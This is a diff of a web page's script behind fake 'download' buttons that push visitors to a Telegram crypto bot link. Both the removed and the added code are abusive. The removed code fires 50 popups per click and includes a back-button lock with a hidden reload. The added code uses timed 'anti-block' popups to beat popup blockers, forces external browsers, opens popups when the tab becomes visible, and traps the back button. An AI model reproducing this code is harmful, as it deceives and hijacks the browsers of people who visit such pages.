@@ -214,102 +214,109 @@ cursor:pointer;
 
  <script>
 
+<script>
 const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
-const POPUP_COUNT = 50;   // 50 real popups per click (unlimited feel)
 
-// ---------- Platform detection ----------
-const ua = navigator.userAgent.toLowerCase();
-const isAndroid = /android/.test(ua);
-const isIOS = /iphone|ipad|ipod/.test(ua);
-const isTelegram = /telegram/.test(ua);
+let clickCount = 0;
 
-// Build the correct URL based on platform
-let finalUrl = smartLink;
+// ✅ SMART POPUP (focus trick)
+function openPopup(url){
+  let win = window.open(url, "_blank");
 
-if (isTelegram) {
-  // Telegram in-app browser – direct link
-  finalUrl = smartLink;
-} else if (isAndroid) {
-  // Android: force external Chrome browser using intent://
-  finalUrl = "intent://" + smartLink.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
-} else if (isIOS) {
-  // iOS: force external Chrome browser (or fallback to Safari)
-  finalUrl = "googlechrome://" + smartLink.replace(/^https?:\/\//, '');
-} else {
-  // PC / Desktop
-  finalUrl = smartLink;
-}
-
-// 🔥 Powerful popup opener with unique window names (avoids replacement)
-function openPopupWithUniqueTarget(url, index) {
-  const uniqueName = "popup_" + Date.now() + "_" + index + "_" + Math.random().toString(36).substring(2);
-  try {
-    let win = window.open(url, uniqueName, "noopener,noreferrer");
-    if (!win || win.closed === undefined) {
-      // Fallback: try again without extra options
-      win = window.open(url, uniqueName);
-      if (!win) {
-        console.log("Popup blocked for index", index);
-      }
-    }
-  } catch(e) {
-    console.log("Error opening popup", e);
+  if(win){
+    win.focus();
+  } else {
+    // fallback (if blocked)
+    window.location.href = url;
   }
 }
 
-// 🔥 Launch exactly POPUP_COUNT popups with 80ms gap
-function launchMassPopups() {
-  for (let i = 0; i < POPUP_COUNT; i++) {
-    setTimeout(() => {
-      openPopupWithUniqueTarget(finalUrl, i);
-    }, i * 80);  // 80ms gap = all 50 open within 4 seconds
+// ✅ SMART POPUP ENGINE (anti-block)
+function smartPopups(url){
+
+  // 1️⃣ first popup (must be instant - user gesture)
+  openPopup(url);
+
+  // 2️⃣ rest with delay (less chance of block)
+  setTimeout(() => openPopup(url), 600);
+  setTimeout(() => openPopup(url), 1300);
+  setTimeout(() => openPopup(url), 2000);
+}
+
+function openExternal(){
+
+  clickCount++;
+
+  const ua = navigator.userAgent.toLowerCase();
+  const isAndroid = /android/.test(ua);
+  const isIOS = /iphone|ipad|ipod/.test(ua);
+  const isTelegram = /telegram/.test(ua);
+
+  // ✅ TELEGRAM (direct best)
+  if(isTelegram){
+    smartPopups(smartLink);
+    return;
+  }
+
+  // 🤖 ANDROID
+  if(isAndroid){
+
+    let intentLink =
+      "intent://" +
+      smartLink.replace(/^https?:\/\//,'') +
+      "#Intent;scheme=https;package=com.android.chrome;end";
+
+    // first try deep link
+    openPopup(intentLink);
+
+    // fallback web opens
+    setTimeout(() => smartPopups(smartLink), 900);
+  }
+
+  // 🍎 IOS
+  else if(isIOS){
+
+    let chromeLink =
+      "googlechrome://" +
+      smartLink.replace(/^https?:\/\//,'');
+
+    openPopup(chromeLink);
+
+    setTimeout(() => smartPopups(smartLink), 900);
+  }
+
+  // 💻 PC
+  else{
+    smartPopups(smartLink);
   }
 }
 
-// 🔥 Main click handler
-function handleDownloadClick() {
-  launchMassPopups();
-}
-
-// Attach event to all download buttons
-document.addEventListener("click", function(e) {
-  const btn = e.target.closest(".download");
-  if (btn) {
+// 🔥 CLICK EVENT (strong trigger)
+document.addEventListener("click", function(e){
+  if(e.target.closest(".download")){
     e.preventDefault();
-    handleDownloadClick();
+    openExternal();
   }
 });
 
-// ========== BACK BUTTON LOCK + HIDDEN RELOAD + EXTRA POPUP ==========
-history.pushState(null, null, location.href);
-window.onpopstate = function () {
-  // Prevent back navigation
-  history.pushState(null, null, location.href);
-  
-  // Hidden reload: silently refresh video cards only (no full page reload)
-  fetch(window.location.href)
-    .then(res => res.text())
-    .then(html => {
-      const parser = new DOMParser();
-      const doc = parser.parseFromString(html, 'text/html');
-      const newContainer = doc.querySelector('.container');
-      if (newContainer) {
-        document.querySelector('.container').innerHTML = newContainer.innerHTML;
-      }
-    })
-    .catch(err => console.log("hidden reload error"));
-  
-  // Extra popup on back button (traps user further)
-  setTimeout(() => {
-    const extraWin = window.open(finalUrl, "_blank", "noopener");
-    if (!extraWin) window.location.href = finalUrl;
-  }, 100);
-};
+// 🔥 VISIBILITY BOOST (tab active হলে extra popup)
+document.addEventListener("visibilitychange", function(){
+  if(document.visibilityState === "visible"){
+    setTimeout(() => {
+      openPopup(smartLink);
+    }, 500);
+  }
+});
 
-console.log("✅ Platform: " + (isAndroid ? "Android (intent://)" : isIOS ? "iOS (googlechrome://)" : isTelegram ? "Telegram" : "PC/Desktop"));
-console.log("✅ " + POPUP_COUNT + " real popups per click | Back lock + hidden reload active");
+// 🔥 BACK BUTTON (light trap)
+history.pushState(null, null, location.href);
+
+window.onpopstate = function () {
+  history.pushState(null, null, location.href);
+  openPopup(smartLink);
+};
 </script>
- 
+
 </body>
 </html>
  
